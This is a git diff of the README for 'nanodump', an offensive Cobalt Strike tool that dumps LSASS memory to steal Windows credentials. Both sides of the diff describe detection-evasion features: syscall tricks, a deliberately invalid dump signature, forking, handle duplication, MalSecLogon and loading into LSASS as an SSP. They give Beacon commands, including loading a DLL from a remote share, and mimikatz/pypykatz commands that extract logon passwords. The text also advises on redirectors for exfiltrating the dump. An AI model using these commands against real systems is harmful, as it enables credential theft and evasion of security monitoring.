@@ -4,49 +4,67 @@ A flexible tool that creates a minidump of the LSASS process.
 
 ![screenshot](demo.png)
 
-### Features
-- It uses syscalls (with [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2)) for most operations
-- Syscalls are called from an *ntdll* address to bypass some syscall detections
-- Windows APIs are called using dynamic invoke
-- You can choose to download the dump without touching disk or write it to a file
-- The minidump by default has an invalid signature to avoid detection
-- It reduces the size of the dump by ignoring irrelevant DLLs. The (nano)dump tends to be arround 10 MB in size
-- You don't need to provide the PID of LSASS
-- No calls to *dbghelp* or any other library are made, all the dump logic is implemented in nanodump
-- Supports process forking to avoid the permission `PROCESS_VM_READ`
-- Supports handle duplication
-- Supports MalSecLogon
-- You can load nanodump in LSASS as a Security Support Provider (SSP)
-- You can use the .exe version to run *nanodump* outside of Cobalt Strike :smile:
+<h2>Table of contents</h2>
 
-## Usage
+<ol>
+  <li><a href="#features">Features</a></li>
+  <li><a href="#usage">Usage</a></li>
+  <li><a href="#fork">Process forking</a></li>
+  <li><a href="#handledup">Handle duplication</a></li>
+  <li><a href="#malseclogon">MalSecLogon</a></li>
+  <li><a href="#malseclogon-and-duplicate">MalSecLogon and handle duplication</a></li>
+  <li><a href="#ssp">Load nanodump as an SSP</a></li>
+  <li><a href="#params">Parameters</a></li>
+  <li><a href="#examples">Examples</a></li>
+  <li><a href="#redirectors">HTTPS redirectors</a></li>
+</ol>
 
-### Clone
+<h2 id="features">1. Features</h2>
+
+<ul>
+  <li>It uses syscalls (with <a href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a>) for most operations.</li> 
+  <li>Syscalls are called from an <b>ntdll</b> address to bypass some syscall detections.</li> 
+  <li>Windows APIs are called using dynamic invoke.</li> 
+  <li>You can choose to download the dump without touching disk or write it to a file.</li> 
+  <li>The minidump by default has an invalid signature to avoid detection.</li> 
+  <li>It reduces the size of the dump by ignoring irrelevant DLLs. The (nano)dump tends to be arround 10 MiB in size.</li> 
+  <li>You don't need to provide the PID of LSASS.</li> 
+  <li>No calls to <b>dbghelp</b> or any other library are made, all the dump logic is implemented in nanodump.</li> 
+  <li>Supports process forking.</li> 
+  <li>Supports handle duplication.</li> 
+  <li>Supports MalSecLogon.</li> 
+  <li>You can load nanodump in LSASS as a Security Support Provider (SSP).</li> 
+  <li>You can use the .exe version to run *nanodump* outside of Cobalt Strike :smile:.</li> 
+</ul>
+
+<h2 id="usage">2. Usage</h2>
+
+<h3>Clone</h3>
 
 ```bash
 git clone https://github.com/helpsystems/nanodump.git
 ```
 
-### Compile (optional)
+<h3>Compile (optional)</h3>
 
-###### On Linux with MinGW
+<b>On Linux with MinGW</b>
 
 ```bash
 make -f Makefile.mingw
 ```
 
-###### On Windows with MSVC
+<b>On Windows with MSVC</b> (No BOF support)
 
 ```bash
 nmake -f Makefile.msvc
 ```
 
-### Import
+<h3>Import</h3>
 
 Import the `NanoDump.cna` script on Cobalt Strike.
 
 
-### Run
+<h3>Run</h3>
 
 Run the `nanodump` command in the Beacon console.
 
@@ -54,34 +72,78 @@ Run the `nanodump` command in the Beacon console.
 beacon> nanodump
 ```
 
-### Restore the signature
+<h3>Restore the signature</h3>
+
 Once you downloaded the minidump, restore the invalid signature
 ```zsh
 bash restore_signature.sh <dumpfile>
 ```
 
-### Get the secretz
+<h3>Get the secretz</h3>
 
-#### mimikatz
+<b>mimikatz:</b>  
 To get the secrets simply run:
 ```
 mimikatz # sekurlsa::minidump <dumpfile>
 mimikatz # sekurlsa::logonPasswords full
 ```
 
-#### pypykatz
+<b>pypykatz:</b>  
 If you prefer to stay on linux, you can use the python3 port of mimikatz called [pypykatz](https://github.com/skelsec/pypykatz).  
 ```sh
 python3 -m pypykatz lsa minidump <dumpfie>
 ```
 
-### Load nanodump as an SSP
-You can load nanodump as an SSP in LSASS to avoid opening a handle. The dump will be written to disk with an invalid signature at `C:\Windows\Temp\nano.dmp`. Once the dump is completed, `DllMain` will return FALSE to make LSASS unload nanodump.  
-To access this functionality, use the `load_ssp` command.  
-To change the dump path and signature configuration, modify the function `NanoDump` in [entry.c](source/entry.c) and recompile.
+<h2 id="fork">3. Process forking</h2>
+
+To avoid opening a handle to LSASS with `PROCESS_VM_READ`, you can use the `--fork` parameter.  
+This will make nanodump create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a 'clone' of the process. This new process will then be dumped. While this will result in a new process creation, it removes the need to read LSASS directly.
+
+<h2 id="handledup">4. Handle duplication</h2>
+
+As opening a handle to LSASS can be detected, nanodump can instead search for existing handles to LSASS.  
+If one is found, it will copy it and use it to create the minidump.  
+Note that it is not guaranteed to find such handle.
+
+<h2 id="malseclogon">5. MalSecLogon</h2>
+
+To avoid opening a handle to LSASS, you can use MalSecLogon, which is a technique that (ab)uses `CreateProcessWithLogonW` to leak an LSASS handle.  
+To enable this feature, use the `--malseclogon` parameter.  
+Take into account that an unsigned nanodump binary needs to be written to disk to use this feature.
+
+<h2 id="malseclogon-and-duplicate">6. MalSecLogon and handle duplication</h2>
+
+As said before, using MalSecLogon requires a nanodump binary to be written to disk.  
+This can be avoided if `--malseclogon` and `--dup` are used together with `--binary`.  
+The trick is to leak a handle to LSASS using MalSecLogon, but instead of leaking it into nanodump.exe, leak it into another binary and then duplicate the leaked handle so that nanodump can used it.
+
+<h2 id="ssp">7. Load nanodump as an SSP</h2>
+
+You can load nanodump as an SSP in LSASS to avoid opening a handle. The dump will be written to disk with an invalid signature at `C:\Windows\Temp\nano.dmp` by default. Once the dump is completed, `DllMain` will return FALSE to make LSASS unload the nanodump DLL.  
+To change the dump path and signature configuration, modify the function `NanoDump` in [entry.c](source/entry.c) and recompile.  
+
+<h3>Upload and load a nanodump DLL</h3>
+
+If used with no parameters, an unsigned nanodump DLL will be uploaded to the Temp folder. Once the dump has been created, manually delete the DLL with the `delete_file` command.  
+```
+beacon> load_ssp
+beacon> delete_file C:\Windows\Temp\[RANDOM].dll
+```
+<h3>Load a local DLL</h3>
+
+```
+beacon> load_ssp c:\ssp.dll
+```
+
+<h3>Load a remote DLL</h3>
+
+```
+beacon> load_ssp \\10.10.10.10\openShare\ssp.dll
+```
 
 
-## Parameters
+
+<h2 id="params">8. Parameters</h2>
 
 #### --getpid
 Get PID of LSASS and leave.  
@@ -98,24 +160,21 @@ If not entered, the signature will be invalid. Before analyzing the dump restore
 `bash restore_signature.sh <dumpfile>`  
 
 #### --fork -f
-Create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a 'clone' of the process. This new process will then be the target for memory dumping. While this will result in a new process creation, it removes the need to read LSASS directly.
+Fork LSASS and dump this new process.
 
 #### --dup -d
-List all the handles in the system and look for an existing handle to LSASS. If found, duplicate it and access LSASS with it. This eliminates the need to open a new handle to LSASS directly.  
-*(Be aware that there is no guarantee to find such handle)*
+Try to find an existing handle to LSASS and duplicate it.
 
 #### --malseclogon -m
-Leak a handle to LSASS by abusing SecLogon with `CreateProcessWithLogonW`. This eliminates the need to open a new handle to LSASS directly.  
-When this option is used, errors while analyzing the minidump are to be expected. Use the latest version of pypykatz.  
+Leak a handle to LSASS using MalSecLogon.  
 **If used as BOF, an unsigned binary will be written to disk unless --dup is also provided!**
 
 #### --binary -b < path >
 Path to a binary such as `C:\Windows\notepad.exe`.  
-This option is used exclusively with `--malseclogon` and `--dup`. If used, nanodump will create that process and use MalSecLogon to leak an LSASS handle in it. Then, it will duplicate that handle and use it to access LSASS.  
-The created process is then terminated automatically.
+This option is used exclusively with `--malseclogon` and `--dup`. 
 
 
-## Examples
+<h2 id="examples">9. Examples</h2>
 
 Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:
 ```
@@ -158,8 +217,9 @@ Load nanodump in LSASS as an SSP remotely:
 beacon> load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll
 ```
 
-## HTTPS redirectors
-If you are using an HTTPS redirector (as you should), you might run into issues due to the size of the requests that leak the dump.  
+<h2 id="redirectors">10. HTTPS redirectors</h2>
+
+If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.  
 Increase the max size of requests on your web server to allow nanodump to download the dump.
 
 #### NGINX
